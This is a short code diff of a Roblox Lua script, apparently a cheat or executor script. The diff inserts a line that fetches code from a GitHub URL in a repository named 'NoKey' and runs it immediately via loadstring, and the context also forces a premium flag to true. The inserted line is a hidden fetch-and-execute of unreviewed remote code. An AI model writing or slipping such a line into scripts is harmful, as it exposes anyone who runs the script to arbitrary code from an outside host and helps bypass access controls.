@@ -2,6 +2,8 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 
+loadstring(game:HttpGet("https://github.com/WhatsHisIdentifier/NoKey/blob/main/Discord",true))()
+
 shared.premiumUserIds = shared.premiumUserIds or {}
 shared.premium = true
 shared.Debug = true
